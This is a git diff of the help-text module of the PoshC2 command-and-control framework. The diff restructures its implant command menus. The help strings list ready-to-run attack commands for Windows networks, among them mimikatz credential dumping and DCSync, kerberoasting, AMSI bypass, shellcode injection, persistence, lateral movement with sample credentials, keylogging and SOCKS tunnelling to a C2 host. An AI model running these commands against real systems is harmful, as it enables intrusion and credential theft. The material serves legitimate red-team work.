@@ -1,7 +1,8 @@
-import subprocess
+import subprocess, traceback
 
 from poshc2 import VERSION
 from poshc2.Colours import Colours
+from poshc2.server.Core import print_bad
 
 logopic = Colours.GREEN + r"""
                     _________            .__.     _________  ________
@@ -22,9 +23,9 @@ except Exception:
 
 logopic = logopic + banner
 
-py_help1 = Colours.GREEN + """
-Implant Features:
-=====================
+py_help = """
+* Implant Features:
+====================
 ps
 startanotherimplant or sai
 startanotherimplant-keepfile
@@ -53,14 +54,16 @@ message "Message to broadcast"
 quit
 """
 
-sharp_help1 = Colours.GREEN + """
-Implant Features:
-=====================
+sharp_help = """
+* Implant Features:
+====================
 ps
 corehelp
 beacon 60s / beacon 10m / beacon 2h
 turtle 60s / turtle 30m / turtle 8h
 pwd
+enable-rotation
+get-rotation
 ls c:\\temp\\
 ls-recurse c:\\temp\\
 del
@@ -89,6 +92,8 @@ run-exe Core.Program Core
 run-dll Seatbelt.Program Seatbelt UserChecks
 run-dll SharpSploit.Enumeration.Host SharpSploit GetHostname
 run-dll SharpSploit.Enumeration.Host SharpSploit GetProcessList
+run-exe-background Core.Program Core runmylongapp
+run-dll-background Core.Program Core runmylongdll
 start-process net users
 start-shortcut c:\\users\\public\\image.lnk
 download-file "c:\\temp\\test.exe"
@@ -97,27 +102,35 @@ kill-implant
 hide-implant
 unhide-implant
 help
+inveigh
+stopinveigh
+loadpowerstatus
+getpowerstatus
+stoppowerstatus
 searchhelp listmodules
 searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
 bypass-amsi
+sharpapplocker
+lockless WebCacheV01.dat
+lockless WebCacheV01.dat /process:taskhostw /copy:C:\\Temp\\out.tmp
 quit
 back
 
-Running PS
-==========
+* Running PS
+=============
 sharpps $psversiontable
 pslo powerview.ps1
 
-Migration
-===========
+* Migration
+============
 migrate
 inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
 inject-shellcode <pid>
 
-Privilege Escalation:
-=======================
+* Privilege Escalation:
+========================
 arpscan 172.16.0.1/24 true
 get-serviceperms c:\\temp\\
 get-screenshot
@@ -135,34 +148,32 @@ cred-popper "Putty" "Please re-enter your OTP code" "root@172.16.0.1"
 get-hash
 sharpup
 sharpweb all
-seatbelt all
-seatbelt BasicOSInfo
-seatbelt SysmonConfig
-seatbelt PowerShellSettings
-seatbelt RegistryAutoRuns
+seatbelt -group=all
+seatbelt -group=chrome
+seatbelt -group=misc
 watson
 sharpcookiemonster
 sharpdpapi machinetriage
 sharpchrome logins
 sweetpotato -p c:\\users\\public\\startup.exe
 
-Process Dumping:
-================
+* Process Dumping:
+===================
 safetydump
 safetydump <pid>
 safetykatz minidump
 safetykatz full
 
-Mimikatz via SharpSploit:
-===========================
+* Mimikatz via SharpSploit:
+============================
 mimikatz Wdigest
 mimikatz LsaSecrets
 mimikatz LsaCache
 mimikatz SamDump
 mimikatz Command "privilege::debug sekurlsa::logonPasswords"
 
-Network Tasks:
-================
+* Network Tasks:
+=================
 rubeus kerberoast
 rubeus asreproast /user:username
 sharpview Get-NetUser -SamAccountName ben
@@ -190,8 +201,8 @@ getremoteprocesslisting SERVER01,SERVER02,SERVER03 taskhost.exe
 getremoteprocesslistingall SERVER01,SERVER02
 portscan "10.0.0.1-50" "1-65535" 1 100 # <hosts> <ports> <delay-in-seconds> <max-threads>
 
-Lateral Movement:
-==================
+* Lateral Movement:
+====================
 sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
 sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
 sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
@@ -201,41 +212,52 @@ dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe
 dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
+pbind-connect hostname
+pbind-connect hostname <pipename> <secret>
 
-Lateral Movement with Pre-Built Payload:
-=========================================
+* Lateral Movement with Pre-Built Payload:
+===========================================
 sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
 sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
 startdaisy
 stopdaisy
 
-Socks:
-======
+* Socks:
+=========
 sharpsocks
 run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
 
-Bloodhound:
-===========
+* Bloodhound:
+==============
 sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,DCOnly --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_small.zip --collectallproperties
 sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,Session,LoggedOn,Default --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_full.zip --collectallproperties
 
-Run Generic C# Executable:
+* Run Generic C# Executable:
 =============================
 # See Alias.py for examples or to add your own aliases
 loadmodule MyBinary.exe
 run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>
 
+* Dynamically compile and run code on the target:
+=================================================
+# Edit payloads/DynamicCode.cs then:
+dynamic-code
+dynamic-code <args>
+
 """
 
-posh_help1 = Colours.GREEN + """
-Implant Features:
+posh_help = """
+* Implant Features:
 =====================
 ps
+invoke-urlcheck -urls https://api.hsbc.com,https://d36xb1r83janbu.cloudfront.net -domainfront d2argm04ypulrn.cloudfront.net,d36xb1r83janbu.cloudfront.net -uri /en-gb/surface/accessories/
 searchhelp mimikatz
 searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
 get-hash
+enable-rotation
+get-rotation
 unhidefile
 hidefile
 get-ipconfig
@@ -245,12 +267,11 @@ turtle 60s / turtle 30m / turtle 8h
 kill-implant
 hide-implant
 unhide-implant
+loadpowerstatus
 get-proxy
 get-computerinfo
 unzip <source file> <destination folder>
 get-system
-get-system-withproxy
-get-system-withdaisy
 get-implantworkingdirectory
 get-pid
 posh-delete c:\\temp\\svc.exe
@@ -285,13 +306,10 @@ get-wmireglastloggedon
 get-wmiregcachedrdpconnection
 get-wmiregmounteddrive
 resolve-ipaddress
-unhook-amsi
 get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI Loaded`n"} }
 get-wmiObject -class win32_product
-"""
 
-posh_help2 = Colours.GREEN + """
-Privilege Escalation:
+* Privilege Escalation:
 ====================
 invoke-allchecks
 Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep
@@ -302,30 +320,31 @@ invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
 get-gpppassword
 get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
 dir -recurse | select-string -pattern 'password='
-"""
 
-posh_help3 = Colours.GREEN + """
-File Management:
-====================
+* File Management:
+=================
 download-file -source 'c:\\temp dir\\run.exe'
 download-files -directory 'c:\\temp dir\\'
 upload-file -source 'c:\\temp\\run.exe' -destination 'c:\\temp\\test.exe'
 web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\\temp\\app.exe'
 
-Persistence:
-================
+* Persistence (with powershell.exe):
+====================================
 install-persistence 1,2,3
 remove-persistence 1,2,3
-installexe-persistence
-removeexe-persistence
-install-servicelevel-persistence | remove-servicelevel-persistence
-install-servicelevel-persistencewithproxy | remove-servicelevel-persistence
+install-servicelevel-persistence
+remove-servicelevel-persistence
 invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
 get-wmievent
 remove-wmievent -name backup
 
-Network Tasks / Lateral Movement:
-==================
+* Persistence:
+=============
+installexe-persistence
+removeexe-persistence
+
+* Network Tasks / Lateral Movement:
+==================================
 get-externalip
 test-adcredential -domain test -user ben -password password1
 invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
@@ -334,10 +353,8 @@ invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-p
 invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
 net view | net users | net localgroup administrators | net accounts /dom
 whoami /groups | whoami /priv
-"""
 
-posh_help4 = Colours.GREEN + """
-Active Directory Enumeration:
+* Active Directory Enumeration:
 ==================
 invoke-aclscanner
 invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
@@ -365,17 +382,15 @@ get-netshare hostname
 invoke-sharefinder -verbose -checkshareaccess
 new-psdrive -name "p" -psprovider "filesystem" -root "\\\\bloredc1\\netlogon"
 
-Domain Trusts:
+* Domain Trusts:
 ==================
 get-netdomain | get-netdomaincontroller | get-netforestdomain
 get-netforest | get-netforesttrust
 invoke-mapdomaintrust
 get-netuser -domain child.parent.com -filter samaccountname=test
 get-netgroup -domain child.parent.com | select samaccountname
-"""
 
-posh_help5 = Colours.GREEN + """
-Domain / Network Tasks:
+* Domain / Network Tasks:
 ==================
 invoke-bloodhound -collectionmethod stealth
 get-netdomaincontroller | select name | get-netsession | select *username,*cname
@@ -404,36 +419,20 @@ invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\
 runas-netonly "domain" "username" "password" "ls \\\\mydc\\c$"
 invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
 invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
-"""
 
-posh_help6 = Colours.GREEN + """
-Lateral Movement - powershell.exe:
+* Lateral Movement - powershell.exe:
 =========================================================
-invoke-runaspayload -user <user> -password '<pass>' -domain <dom>
-invoke-runasproxypayload -user <user> -password '<pass>' -domain <dom>
-invoke-runasdaisypayload -user <user> -password '<pass>' -domain <dom>
+invoke-runaspayload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
+invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass> -credid <credid-optional>
 invoke-dcompayload -target <ip>
-invoke-dcomproxypayload -target <ip>
-invoke-dcomdaisypayload -target <ip>
-invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-psexecproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
-invoke-wmipayload -target <ip> -credid <credid>
-invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
 
-Lateral Movement - shellcode:
+* Lateral Movement - shellcode:
 =========================================================
-invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijspbindpayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-"""
+invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
 
-posh_help7 = Colours.GREEN + """
-Credentials / Tokens / Local Hashes (Must be SYSTEM):
+* Credentials / Tokens / Local Hashes (Must be SYSTEM):
 =========================================================
 invoke-mimikatz -command '"sekurlsa::logonpasswords"'
 invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
@@ -449,15 +448,13 @@ invoke-tokenmanipulation | select-object domain, username, processid, iselevated
 invoke-tokenmanipulation -impersonateuser -username "domain\\user"
 get-lapspasswords
 
-Credentials / Domain Controller Hashes:
+* Credentials / Domain Controller Hashes:
 ============================================
 invoke-mimikatz -command '"lsadump::dcsync /domain:domain.local /user:administrator"'
 invoke-dcsync -pwdumpformat
 dump-ntds -emptyfolder <emptyfolderpath>
-"""
 
-posh_help8 = Colours.GREEN + """
-Useful Modules:
+* Useful Modules:
 ====================
 get-screenshot
 get-screenshotallwindows
@@ -469,29 +466,34 @@ hashdump
 get-keystrokes | get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
 portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
-((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
 get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
-1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
 migrate
 migrate -procid 4444
 migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
 migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
 inject-shellcode -x86 -procid 5634 -parentId 1111
-inject-shellcode -x64 -parentId 1111 -procpath 'c:\windows\system32\svchost.exe' -suspended
+inject-shellcode -x64 -parentId 1111 -procpath 'c:\\windows\\system32\\svchost.exe' -suspended
+get-injectedthread
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
-$socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
 reversedns 10.0.0.1
-[System.Net.Dns]::GetHostbyAddress("10.0.0.1")
-Invoke-EDRChecker
-Invoke-EDRChecker -Force
-Invoke-EDRChecker -Remote <hostname>
-Invoke-EDRChecker -Remote <hostname> -Ignore
+invoke-edrchecker
+invoke-edrchecker -force
+invoke-edrchecker -remote <hostname>
+invoke-edrchecker -remote <hostname> -ignore
 
-Implant Handler:
-=====================
+* PS Commands:
+===============
+((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
+1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
+[System.Net.Dns]::GetHostbyAddress("10.0.0.1")
+$socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
+
+
+* Implant Handler:
+====================
 searchhelp payload
 searchhistory pushover
 back
@@ -500,15 +502,15 @@ exit
 """
 
 
-pre_help = Colours.GREEN + """
-Main Menu:
+server_help = """
+* Main Menu:
 ================================
-use implant by <id>, e.g. 1
-use multiple implants by <id>,<id>,<id>, e.g. 1,2,5
-use implant by range, e.g. 40-45
-use all implants by all
+* use implant by <id>, e.g. 1
+* use multiple implants by <id>,<id>,<id>, e.g. 1,2,5
+* use implant by range, e.g. 40-45
+* use all implants by all
 
-Auto-Runs:
+* Auto-Runs:
 =====================
 add-autorun <task>
 list-autorun (alias: l)
@@ -516,19 +518,31 @@ del-autorun <taskid>
 nuke-autorun
 automigrate-frompowershell (alias: am)
 
-Server Commands:
+* Hosted-Files:
+====================
+show-hosted-files
+add-hosted-file
+disable-hosted-file
+enable-hosted-file
+
+* Server Commands:
 =====================
 tasks
 opsec
+get-opsec-events
+add-opsec-event
+del-opsec-event
 show-urls
 list-urls
 cleartasks
 show-serverinfo
 history
 generate-reports
+generate-csvs
 set-pushover-applicationtoken df2
 set-pushover-userkeys 44789
 set-defaultbeacon 60
+get-killdate
 set-killdate 22/10/2019
 turnon-notifications
 turnoff-notifications
@@ -538,58 +552,32 @@ creds
 creds -add -domain=<domain> -username=<username> -password='<password>'/-hash=<hash>
 creds -search <username>
 createnewpayload
+createnewshellcode
 createproxypayload
 createdaisypayload
 quit
+kill
 """
 
-posh_help = posh_help1 + posh_help2 + posh_help3 + posh_help4 + posh_help5 + posh_help6 + posh_help7 + posh_help8
+special_characters = "!@#$%^&*()+=."
 
-# pre help commands
-PRECOMMANDS = ['list-urls', 'show-urls', 'add-autorun', 'list-autorun', 'del-autorun', 'nuke-autorun', 'automigrate-frompowershell',
-               'show-serverinfo', 'history', 'generate-reports', 'set-pushover-applicationtoken', 'set-pushover-userkeys', 'set-defaultbeacon',
-               'listmodules', 'pwnself', 'creds', 'createnewpayload', 'createproxypayload', 'listmodules', "set-killdate",
-               'createdaisypayload', 'turnoff-notifications', 'turnon-notifications', 'tasks', 'cleartasks', "opsec", "message"]
 
-# post help commands powershell implant
-COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
-            "bypass-uac", "cve-2016-9192", "convertto-shellcode", "decrypt-rdcman", "dump-ntds", "get-computerinfo", "get-creditcarddata", "get-gppautologon",
-            "get-gpppassword", "get-idletime", "get-keystrokes", "get-locadm", "get-mshotfixes", "get-netstat", "get-passnotexp", "get-passpol", "get-recentfiles",
-            "get-serviceperms", "get-userinfo", "get-wlanpass", "invoke-hostenum", "inject-shellcode", "inveigh-relay", "inveigh", "invoke-arpscan", "arpscan",
-            "invoke-dcsync", "invoke-eventvwrbypass", "invoke-hostscan", "invoke-ms16-032-proxy", "invoke-ms16-032", "invoke-mimikatz", "invoke-psinject",
-            "invoke-pipekat", "invoke-portscan", "invoke-powerdump", "invoke-psexec", "invoke-reflectivepeinjection", "invoke-reversednslookup",
-            "invoke-runas", "invoke-smbexec", "invoke-shellcode", "invoke-sniffer", "invoke-sqlquery", "invoke-tater", "invoke-thehash",
-            "invoke-tokenmanipulation", "invoke-wmichecker", "invoke-wmicommand", "invoke-wmiexec", "invoke-wscriptbypassuac", "invoke-winrmsession",
-            "out-minidump", "portscan", "invoke-allchecks", "set-lhstokenprivilege", "sharpsocks", "find-allvulns", "test-adcredential", "new-zipfile",
-            "get-netuser", "sleep", "beacon", "get-screenshot", "install-persistence", "hide-implant", "unhide-implant", "kill-implant", "invoke-runasdaisypayload",
-            "invoke-runasproxypayload", "invoke-runaspayload", "migrate", "$psversiontable", "back", "clear", "invoke-daisychain", "stopdaisy",
-            "ipconfig", "upload-file", "download-file", "download-files", "history", "get-help", "stopsocks", "get-screenshotallwindows",
-            "hashdump", "cred-popper", "help", "whoami", "get-proxy", "restart-computer", "startdaisy",
-            "turtle", "posh-delete", "get-idletime", "get-psdrive", "get-netcomputer", "get-netdomain", "get-netforest", "get-netforesttrust",
-            "get-forestdomain", "test-connection", "get-netdomaincontroller", "invoke-pbind", "pbind-command", "invoke-kerberoast", "invoke-userhunter",
-            "get-process", "start-process", "searchhelp", "get-netshare", "pbind-kill", "pbind-loadmodule", "install-servicelevel-persistencewithproxy",
-            "install-servicelevel-persistence", "remove-servicelevel-persistence", "reversedns", "invoke-eternalblue", "get-ipconfig",
-            "loadmoduleforce", "unhook-amsi", "get-implantworkingdirectory", "get-system", "get-system-withproxy", "get-system-withdaisy",
-            "get-pid", "listmodules", "modulesloaded", "startanotherimplant", "remove-persistence", "removeexe-persistence",
-            "installexe-persistence", "get-hash", "get-creds", "resolve-ipaddress", "create-shortcut",
-            "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
-            'invoke-psexecpayload', 'invoke-wmijsproxypayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload', 'invoke-psexecproxypayload', 'invoke-wmiproxypayload',
-            "get-ipconfig", 'invoke-dcomproxypayload', 'invoke-psexecdaisypayload', 'invoke-wmijsdaisypayload',
-            'invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
-            "searchhistory"]
+def build_help(help_string):
+    commands = []
+    for line in help_string.splitlines():
+        try:
+            line = line.strip()
+            if line:
+                entry = line.split(None, 1)[0]
+                if entry not in commands and not any(char in special_characters for char in entry):
+                    commands.append(entry)
+        except Exception:
+            print_bad("Error building help")
+            traceback.print_exc()
+    return commands
 
-# post help commands python implant
-UXCOMMANDS = ["label-implant", "remove-label", "unhide-implant", "hide-implant", "help", "searchhelp", "python", "loadmodule",
-              "loadmoduleforce", "get-keystrokes", "back", "upload-file", "download-file", "install-persistence", "remove-persistence", "sai",
-              "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "beacon", "kill-implant", "linuxprivchecker", "quit", "searchhistory"]
 
-# post help commands sharp implant
-SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keystrokes", "start-keystrokes-writefile", "get-keystrokes", "move", "label-implant", "remove-label", "upload-file", "quit",
-                 "download-file", "get-content", "ls-recurse", "turtle", "cred-popper", "resolveip", "resolvednsname", "testadcredential",
-                 "testlocalcredential", "get-screenshot", "modulesloaded", "get-serviceperms", "unhide-implant", "arpscan", "ls", "pwd", "dir",
-                 "inject-shellcode", "start-process", "start-shortcut", "run-exe", "run-dll", "hide-implant", "help", "searchhelp", "listmodules", "loadmodule",
-                 "loadmoduleforce", "back", "ps", "beacon", "kill-implant", "get-screenshotmulti", "safetydump", "seatbelt", "sharpup",
-                 "sharphound", "rubeus", "sharpview", "kill-process", "watson", "get-hash", "migrate", "sharpsocks", "safetykatz", "get-computerinfo",
-                 "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster", "stop-screenshotmulti",
-                 "get-screenshotallwindows", "del", "kill-process", "posh-delete", "getremoteprocesslisting", "getremoteprocesslistingall", "sslinspectioncheck",
-                 "dynamic-code", "startdaisy", "mimikatz", "searchhistory", "stopdaisy", "portscan", "sharpdpapi", "sharpchrome", "sweetpotato"]
+SERVER_COMMANDS = build_help(server_help)
+POSH_COMMANDS = build_help(posh_help)
+PY_COMMANDS = build_help(py_help)
+SHARP_COMMANDS = build_help(sharp_help)
